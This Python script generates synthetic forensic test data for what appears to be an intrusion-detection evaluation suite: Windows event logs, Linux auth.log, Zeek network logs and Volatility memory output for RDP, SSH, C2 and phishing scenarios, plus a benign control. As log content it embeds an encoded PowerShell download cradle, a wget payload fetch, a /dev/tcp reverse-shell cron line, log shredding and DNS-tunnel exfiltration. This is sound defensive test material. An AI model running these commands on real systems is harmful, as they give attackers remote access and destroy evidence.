#!/usr/bin/env python3
"""Generate the synthetic, reproducible evaluation scenarios shipped in ``samples/``.

All data is fictitious: IPs come from RFC 5737 documentation ranges, domains use
reserved ``.example``-style names. Formats match what nix-forensics tools emit:
``evtx_dump -o jsonl``, Linux auth.log, mactime bodyfile, Zeek TSV logs and Volatility 3 JSON.

    python samples/generate.py          # rewrites samples/*/
"""

from __future__ import annotations

import base64
import json
import random
import string
from datetime import UTC, datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).parent
rng = random.Random(1337)


# ----------------------------------------------------------------------------- helpers


def evtx_record(rid: int, ts: datetime, channel: str, event_id: int, computer: str, data: dict) -> dict:
    return {
        "Event": {
            "#attributes": {"xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"},
            "System": {
                "Provider": {
                    "#attributes": {
                        "Name": "Microsoft-Windows-Security-Auditing"
                        if channel == "Security"
                        else "Service Control Manager"
                    }
                },
                "EventID": event_id,
                "TimeCreated": {"#attributes": {"SystemTime": ts.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"}},
                "EventRecordID": rid,
                "Channel": channel,
                "Computer": computer,
            },
            "EventData": data,
        }
    }


def write_jsonl(path: Path, records: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("".join(json.dumps(r) + "\n" for r in records))


def syslog_ts(ts: datetime) -> str:
    return (
        ts.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if ts.day < 10 else ts.strftime("%b %d %H:%M:%S")
    )


# ----------------------------------------------------------------------------- scenario 1


def windows_rdp_intrusion() -> None:
    """External RDP brute force -> admin logon -> backdoor account -> malicious service -> log wipe."""
    out = ROOT / "win-rdp-intrusion"
    host = "WS-FIN-042.corp.example.lan"
    attacker = "203.0.113.45"
    t = datetime(2026, 10, 14, 1, 12, 3, tzinfo=UTC)
    sec, sysl, ps = [], [], []
    rid = 50_000

    def add(bucket, ts, channel, eid, data):
        nonlocal rid
        rid += 1
        bucket.append(evtx_record(rid, ts, channel, eid, host, data))

    # Benign noise: interactive logons of the legitimate user during the previous day.
    for i in range(60):
        ts = datetime(2026, 10, 13, 8, 0, tzinfo=UTC) + timedelta(minutes=9 * i + rng.randint(0, 5))
        add(
            sec,
            ts,
            "Security",
            4624,
            {
                "TargetUserName": "m.durand",
                "TargetDomainName": "CORP",
                "LogonType": 2,
                "IpAddress": "-",
                "WorkstationName": "WS-FIN-042",
            },
        )
        if i % 6 == 0:
            add(
                sec,
                ts + timedelta(minutes=1),
                "Security",
                4688,
                {
                    "SubjectUserName": "m.durand",
                    "NewProcessName": "C:\\Program Files\\Microsoft Office\\EXCEL.EXE",
                    "CommandLine": '"EXCEL.EXE" Q3-budget.xlsx',
                },
            )

    # Brute force: 45 failures against common accounts.
    for i in range(45):
        user = rng.choice(["administrator", "administrator", "admin", "m.durand"])
        add(
            sec,
            t + timedelta(seconds=4 * i),
            "Security",
            4625,
            {
                "TargetUserName": user,
                "LogonType": 10,
                "IpAddress": attacker,
                "IpPort": str(50000 + i),
                "Status": "0xc000006d",
                "SubStatus": "0xc000006a",
                "WorkstationName": "kali",
            },
        )
    t2 = t + timedelta(seconds=4 * 45 + 7)
    add(
        sec,
        t2,
        "Security",
        4624,
        {
            "TargetUserName": "administrator",
            "TargetDomainName": "WS-FIN-042",
            "LogonType": 10,
            "IpAddress": attacker,
            "WorkstationName": "kali",
        },
    )
    add(
        sec,
        t2 + timedelta(seconds=1),
        "Security",
        4672,
        {"SubjectUserName": "administrator", "PrivilegeList": "SeDebugPrivilege SeBackupPrivilege"},
    )
    # Discovery
    for j, cmd in enumerate(
        ["whoami /all", "net user", "net localgroup administrators", "nltest /dclist:corp"]
    ):
        add(
            sec,
            t2 + timedelta(minutes=2, seconds=20 * j),
            "Security",
            4688,
            {
                "SubjectUserName": "administrator",
                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": f"cmd.exe /c {cmd}",
            },
        )
    # Backdoor account
    t3 = t2 + timedelta(minutes=6)
    add(sec, t3, "Security", 4720, {"TargetUserName": "svc_backup", "SubjectUserName": "administrator"})
    add(
        sec,
        t3 + timedelta(seconds=30),
        "Security",
        4732,
        {
            "MemberName": "-",
            "MemberSid": "S-1-5-21-1111-2222-3333-1105",
            "TargetUserName": "Administrators",
            "SubjectUserName": "administrator",
        },
    )
    # Download cradle via encoded PowerShell, installed as a service
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    t4 = t3 + timedelta(minutes=3)
    add(
        ps,
        t4,
        "Microsoft-Windows-PowerShell/Operational",
        4104,
        {"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": payload, "ScriptBlockId": "7c0e5d3e"},
    )
    add(
        sysl,
        t4 + timedelta(seconds=40),
        "System",
        7045,
        {
            "ServiceName": "WinUpdateHelper",
            "ImagePath": f"%COMSPEC% /c powershell.exe -nop -w hidden -enc {enc}",
            "ServiceType": "user mode service",
            "StartType": "auto start",
            "AccountName": "LocalSystem",
        },
    )
    # Log wipe
    add(
        sec,
        t4 + timedelta(minutes=9),
        "Security",
        1102,
        {"SubjectUserName": "administrator", "SubjectDomainName": "WS-FIN-042"},
    )
    write_jsonl(out / "Security.jsonl", sec)
    write_jsonl(out / "System.jsonl", sysl)
    write_jsonl(out / "PowerShell-Operational.jsonl", ps)


# ----------------------------------------------------------------------------- scenario 2


def linux_ssh_compromise() -> None:
    """SSH brute force on a web server -> valid account -> sudo -> backdoor user -> cron reverse shell."""
    out = ROOT / "linux-ssh-compromise"
    out.mkdir(parents=True, exist_ok=True)
    host = "web-prod-01"
    attacker = "198.51.100.23"
    lines = []
    t = datetime(2026, 10, 20, 22, 40, 0, tzinfo=UTC)
    pid = 41000

    def log(ts, prog, msg, with_pid=True):
        nonlocal pid
        pid += 1
        tag = f"{prog}[{pid}]" if with_pid else prog
        lines.append(f"{syslog_ts(ts)} {host} {tag}: {msg}")

    for i in range(30):  # benign cron + admin activity
        ts = t - timedelta(hours=6) + timedelta(minutes=10 * i)
        log(ts, "CRON", "(root) CMD (/usr/lib/php/sessionclean)")
        if i % 10 == 0:
            log(
                ts + timedelta(minutes=2),
                "sshd",
                "Accepted publickey for ops from 10.10.0.5 port 51022 ssh2: ED25519 SHA256:abc",
            )
    for i in range(60):
        user = rng.choice(["root", "admin", "deploy", "ubuntu", "test", "oracle"])
        ts = t + timedelta(seconds=2 * i)
        if user in ("test", "oracle"):
            log(ts, "sshd", f"Invalid user {user} from {attacker} port {40000 + i}")
        log(
            ts,
            "sshd",
            f"Failed password for {'invalid user ' if user in ('test', 'oracle') else ''}{user} "
            f"from {attacker} port {40000 + i} ssh2",
        )
    t2 = t + timedelta(seconds=125)
    log(t2, "sshd", f"Accepted password for deploy from {attacker} port 40111 ssh2")
    log(t2, "sshd", "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)")
    t3 = t2 + timedelta(minutes=3)
    log(t3, "sudo", "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash", with_pid=False)
    log(t3, "sudo", "pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)")
    log(
        t3 + timedelta(minutes=1),
        "useradd",
        "new user: name=sysupdate, UID=0, GID=0, home=/var/tmp/.su, shell=/bin/bash, from=/dev/pts/0",
    )
    log(t3 + timedelta(minutes=1, seconds=5), "usermod", "add 'sysupdate' to group 'sudo'")
    log(
        t3 + timedelta(minutes=2),
        "sudo",
        "  deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -q http://203.0.113.99/kworkerd -O /tmp/.kworkerd",
        with_pid=False,
    )
    log(t3 + timedelta(minutes=3), "crontab", "(root) REPLACE (root)")
    for k in range(4):
        log(
            t3 + timedelta(minutes=5 * (k + 1)),
            "CRON",
            "(root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.99/4444 0>&1')",
        )
    log(
        t3 + timedelta(minutes=25),
        "sudo",
        "  deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1",
        with_pid=False,
    )
    (out / "auth.log").write_text("\n".join(lines) + "\n")

    # Filesystem timeline (bodyfile, e.g. from `fls -m / -r` or nix-forensics timeliner)
    epoch = lambda d: str(int(d.timestamp()))  # noqa: E731
    body = [
        f"0|/var/www/html/index.php|1201|r/rrw-r--r--|33|33|5120|{epoch(t - timedelta(days=30))}|{epoch(t - timedelta(days=30))}|{epoch(t - timedelta(days=30))}|{epoch(t - timedelta(days=30))}",
        f"0|/tmp/.kworkerd|5531|r/rrwxr-xr-x|0|0|884736|{epoch(t3 + timedelta(minutes=2))}|{epoch(t3 + timedelta(minutes=2))}|{epoch(t3 + timedelta(minutes=2))}|{epoch(t3 + timedelta(minutes=2))}",
        f"0|/var/spool/cron/crontabs/root|7710|r/rrw-------|0|0|212|{epoch(t3 + timedelta(minutes=3))}|{epoch(t3 + timedelta(minutes=3))}|{epoch(t3 + timedelta(minutes=3))}|{epoch(t - timedelta(days=200))}",
        f"0|/var/tmp/.su/.bashrc|7801|r/rrw-r--r--|0|0|3771|{epoch(t3 + timedelta(minutes=1))}|{epoch(t3 + timedelta(minutes=1))}|{epoch(t3 + timedelta(minutes=1))}|{epoch(t3 + timedelta(minutes=1))}",
    ]
    (out / "timeline.body").write_text("\n".join(body) + "\n")


# ----------------------------------------------------------------------------- scenario 3


ZEEK_HEADER = """#separator \\x09
#set_separator\t,
#empty_field\t(empty)
#unset_field\t-
#path\t{path}
#open\t2026-11-02-00-00-00
#fields\t{fields}
#types\t{types}
"""


def network_c2_exfil() -> None:
    """Workstation beaconing over HTTPS every ~60s, then DNS tunneling exfiltration."""
    out = ROOT / "network-c2-exfil"
    out.mkdir(parents=True, exist_ok=True)
    victim, c2 = "10.20.4.15", "192.0.2.77"
    t0 = datetime(2026, 11, 2, 9, 0, tzinfo=UTC).timestamp()
    conn_fields = [
        "ts",
        "uid",
        "id.orig_h",
        "id.orig_p",
        "id.resp_h",
        "id.resp_p",
        "proto",
        "service",
        "duration",
        "orig_bytes",
        "resp_bytes",
        "conn_state",
    ]
    conn_types = [
        "time",
        "string",
        "addr",
        "port",
        "addr",
        "port",
        "enum",
        "string",
        "interval",
        "count",
        "count",
        "string",
    ]
    rows = []
    uid = lambda: "C" + "".join(rng.choices(string.ascii_letters + string.digits, k=17))  # noqa: E731
    for _ in range(80):  # benign browsing from several hosts
        src = f"10.20.4.{rng.randint(10, 60)}"
        dst = rng.choice(["93.184.216.34", "151.101.1.69", "140.82.112.3", "13.107.42.14"])
        rows.append(
            [
                f"{t0 + rng.uniform(0, 3600):.6f}",
                uid(),
                src,
                str(rng.randint(49152, 65000)),
                dst,
                "443",
                "tcp",
                "ssl",
                f"{rng.uniform(0.1, 30):.6f}",
                str(rng.randint(500, 9000)),
                str(rng.randint(2000, 900000)),
                "SF",
            ]
        )
    for i in range(55):  # beacon: 60s +- 2s
        ts = t0 + 60 * i + rng.uniform(-2, 2)
        rows.append(
            [
                f"{ts:.6f}",
                uid(),
                victim,
                str(rng.randint(49152, 65000)),
                c2,
                "443",
                "tcp",
                "ssl",
                f"{rng.uniform(0.2, 0.4):.6f}",
                str(rng.randint(180, 260)),
                str(rng.randint(90, 140)),
                "SF",
            ]
        )
    rows.sort(key=lambda r: float(r[0]))
    (out / "conn.log").write_text(
        ZEEK_HEADER.format(path="conn", fields="\t".join(conn_fields), types="\t".join(conn_types))
        + "\n".join("\t".join(r) for r in rows)
        + "\n#close\t2026-11-02-10-00-00\n"
    )

    dns_fields = [
        "ts",
        "uid",
        "id.orig_h",
        "id.orig_p",
        "id.resp_h",
        "id.resp_p",
        "proto",
        "query",
        "qtype_name",
        "rcode_name",
    ]
    dns_types = ["time", "string", "addr", "port", "addr", "port", "enum", "string", "string", "string"]
    drows = []
    for _ in range(120):
        src = f"10.20.4.{rng.randint(10, 60)}"
        q = rng.choice(
            [
                "www.example.com",
                "login.example.org",
                "cdn.example.net",
                "updates.example.com",
                "mail.corp.example.lan",
            ]
        )
        drows.append(
            [
                f"{t0 + rng.uniform(0, 3600):.6f}",
                uid(),
                src,
                str(rng.randint(1024, 65000)),
                "10.20.0.53",
                "53",
                "udp",
                q,
                "A",
                "NOERROR",
            ]
        )
    secret = (
        base64.b32encode(b"Q3-budget.xlsx " + bytes(rng.getrandbits(8) for _ in range(600)))
        .decode()
        .rstrip("=")
        .lower()
    )
    chunks = [secret[i : i + 48] for i in range(0, len(secret), 48)]
    for i, chunk in enumerate(chunks):
        drows.append(
            [
                f"{t0 + 2400 + 3 * i:.6f}",
                uid(),
                victim,
                str(rng.randint(1024, 65000)),
                "10.20.0.53",
                "53",
                "udp",
                f"{chunk}.{i:03d}.cdn-sync.example",
                "TXT",
                "NOERROR",
            ]
        )
    drows.sort(key=lambda r: float(r[0]))
    (out / "dns.log").write_text(
        ZEEK_HEADER.format(path="dns", fields="\t".join(dns_fields), types="\t".join(dns_types))
        + "\n".join("\t".join(r) for r in drows)
        + "\n#close\t2026-11-02-10-00-00\n"
    )


# ----------------------------------------------------------------------------- scenario 4 (control)


def benign_admin_day() -> None:
    """Normal admin activity, used to measure false positives (should NOT be reported as an intrusion)."""
    out = ROOT / "benign-admin-day"
    host = "SRV-FILE-01.corp.example.lan"
    recs, rid = [], 9000
    t = datetime(2026, 10, 15, 7, 30, tzinfo=UTC)
    for i in range(120):
        rid += 1
        user = rng.choice(["j.martin", "a.petit", "svc_veeam", "m.durand"])
        ts = t + timedelta(minutes=4 * i)
        if i % 17 == 0:  # a few typos
            recs.append(
                evtx_record(
                    rid,
                    ts,
                    "Security",
                    4625,
                    host,
                    {
                        "TargetUserName": user,
                        "LogonType": 3,
                        "IpAddress": "10.20.4.31",
                        "Status": "0xc000006d",
                    },
                )
            )
            rid += 1
        recs.append(
            evtx_record(
                rid,
                ts + timedelta(seconds=5),
                "Security",
                4624,
                host,
                {"TargetUserName": user, "LogonType": 3, "IpAddress": f"10.20.4.{rng.randint(10, 60)}"},
            )
        )
    rid += 1
    recs.append(
        evtx_record(
            rid,
            t + timedelta(hours=3),
            "Security",
            4688,
            host,
            {
                "SubjectUserName": "j.martin",
                "NewProcessName": "C:\\Windows\\System32\\wbadmin.exe",
                "CommandLine": "wbadmin start backup -backupTarget:\\\\nas01\\backup -quiet",
            },
        )
    )
    write_jsonl(out / "Security.jsonl", recs)


def windows_memory_phishing() -> None:
    """Volatility 3 output of a workstation compromised by a malicious Word document.

    WINWORD.EXE starts an encoded PowerShell download cradle, the payload runs as a fake svchost.exe
    from the user's Temp folder, keeps a C2 connection, and injects a PE into explorer.exe.
    Noise: a legitimate Chrome JIT region (RWX without MZ header) and normal system processes.
    Files match ``vol -r json -f memory.raw windows.<plugin>``.
    """
    out = ROOT / "win-memory-phishing"
    out.mkdir(exist_ok=True)
    t0 = datetime(2026, 10, 20, 7, 58, 12, tzinfo=UTC)

    def iso(delta: timedelta) -> str:
        return (t0 + delta).isoformat()

    procs = [  # pid, ppid, name, start offset, session
        (4, 0, "System", timedelta(0), None),
        (312, 4, "smss.exe", timedelta(seconds=1), None),
        (428, 420, "csrss.exe", timedelta(seconds=3), 0),
        (504, 420, "wininit.exe", timedelta(seconds=3), 0),
        (560, 492, "winlogon.exe", timedelta(seconds=4), 1),
        (640, 504, "services.exe", timedelta(seconds=4), 0),
        (652, 504, "lsass.exe", timedelta(seconds=4), 0),
        (788, 640, "svchost.exe", timedelta(seconds=6), 0),
        (860, 640, "svchost.exe", timedelta(seconds=6), 0),
        (1024, 640, "svchost.exe", timedelta(seconds=7), 0),
        (2164, 2140, "explorer.exe", timedelta(minutes=1, seconds=30), 1),
        (3020, 2164, "OneDrive.exe", timedelta(minutes=1, seconds=45), 1),
        (3100, 2164, "chrome.exe", timedelta(minutes=12), 1),
        (3412, 2164, "WINWORD.EXE", timedelta(hours=1, minutes=44, seconds=3), 1),
        (4720, 3412, "powershell.exe", timedelta(hours=1, minutes=44, seconds=41), 1),
        (5120, 4720, "svchost.exe", timedelta(hours=1, minutes=45, seconds=20), 1),
    ]
    pslist = [
        {
            "CreateTime": iso(start),
            "ExitTime": None,
            "File output": "Disabled",
            "Handles": None,
            "ImageFileName": name,
            "Offset(V)": 0xFFFF8A0F00000000 + pid * 0x100,
            "PID": pid,
            "PPID": ppid,
            "SessionId": session,
            "Threads": 4 + pid % 23,
            "Wow64": False,
            "__children": [],
        }
        for pid, ppid, name, start, session in procs
    ]

    stage = "http://198.51.100.23/stage2.ps1"
    cradle = f"IEX (New-Object Net.WebClient).DownloadString('{stage}')"
    encoded = base64.b64encode(cradle.encode("utf-16-le")).decode()
    args = {
        4: None,
        312: "\\SystemRoot\\System32\\smss.exe",
        428: "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768",
        504: "wininit.exe",
        560: "winlogon.exe",
        640: "C:\\Windows\\system32\\services.exe",
        652: "C:\\Windows\\system32\\lsass.exe",
        788: "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
        860: "C:\\Windows\\system32\\svchost.exe -k RPCSS -p",
        1024: "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
        2164: "C:\\Windows\\Explorer.EXE",
        3020: '"C:\\Users\\l.bernard\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
        3100: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"',
        3412: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n '
        '"C:\\Users\\l.bernard\\Downloads\\Facture_2026-10.docm"',
        4720: f"powershell.exe -nop -w hidden -enc {encoded}",
        5120: "C:\\Users\\l.bernard\\AppData\\Local\\Temp\\svchost.exe -k netsvcs",
    }
    names = {pid: name for pid, _, name, _, _ in procs}
    cmdline = [{"Args": a, "PID": pid, "Process": names[pid], "__children": []} for pid, a in args.items()]

    def conn(pid, local, lport, remote, rport, state, created):
        return {
            "Created": iso(created) if created else None,
            "ForeignAddr": remote,
            "ForeignPort": rport,
            "LocalAddr": local,
            "LocalPort": lport,
            "Offset": 0xC5000000 + lport,
            "Owner": names[pid],
            "PID": pid,
            "Proto": "TCPv4",
            "State": state,
            "__children": [],
        }

    me = "10.30.2.41"
    netscan = [
        conn(788, "0.0.0.0", 135, "0.0.0.0", 0, "LISTENING", timedelta(seconds=6)),
        conn(652, "0.0.0.0", 49664, "0.0.0.0", 0, "LISTENING", timedelta(seconds=5)),
        conn(1024, me, 50112, "10.30.0.10", 445, "ESTABLISHED", timedelta(minutes=2)),
        conn(3020, me, 50340, "203.0.113.80", 443, "ESTABLISHED", timedelta(minutes=2)),
        conn(3100, me, 51022, "203.0.113.15", 443, "ESTABLISHED", timedelta(minutes=58)),
        conn(4720, me, 51877, "198.51.100.23", 80, "CLOSED", timedelta(hours=1, minutes=44, seconds=43)),
        conn(
            5120, me, 51890, "198.51.100.23", 8443, "ESTABLISHED", timedelta(hours=1, minutes=45, seconds=25)
        ),
        conn(4720, me, 51902, "198.51.100.23", 443, "ESTABLISHED", timedelta(hours=1, minutes=46, seconds=2)),
    ]

    def vol_hexdump(data: bytes) -> str:
        """Same layout as Volatility 3's JSON renderer: quoted, leading newline, 16 bytes + ASCII per line."""
        lines = []
        for i in range(0, len(data), 16):
            chunk = data[i : i + 16]
            text = "".join(chr(b) if 0x20 <= b <= 0x7E else "." for b in chunk)
            lines.append(" ".join(f"{b:02x}" for b in chunk) + " " + text)
        return '"\n' + "\n".join(lines) + '"'

    def region(pid, start, hexdump):
        return {
            "CommitCharge": 16,
            "Disasm": "",
            "End VPN": start + 0xFFFF,
            "File output": "Disabled",
            "Hexdump": vol_hexdump(bytes.fromhex(hexdump)),
            "Notes": None,
            "PID": pid,
            "PrivateMemory": 1,
            "Process": names[pid],
            "Protection": "PAGE_EXECUTE_READWRITE",
            "Start VPN": start,
            "Tag": "VadS",
            "__children": [],
        }

    mz = "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
    jit = "49 8b c4 48 89 58 08 48 89 68 10 48 89 70 18 57 48 83 ec 20 48 8b f2 48 8b e9 33 ff 8b df 85 d2"
    malfind = [region(3100, 0x2A4F0000, jit), region(2164, 0x7FF6A0000, mz)]

    for name, rows in (("pslist", pslist), ("cmdline", cmdline), ("netscan", netscan), ("malfind", malfind)):
        (out / f"windows.{name}.json").write_text("\n" + json.dumps(rows, indent=2, sort_keys=True) + "\n")


if __name__ == "__main__":
    windows_rdp_intrusion()
    linux_ssh_compromise()
    network_c2_exfil()
    benign_admin_day()
    windows_memory_phishing()
    print("samples regenerated in", ROOT)
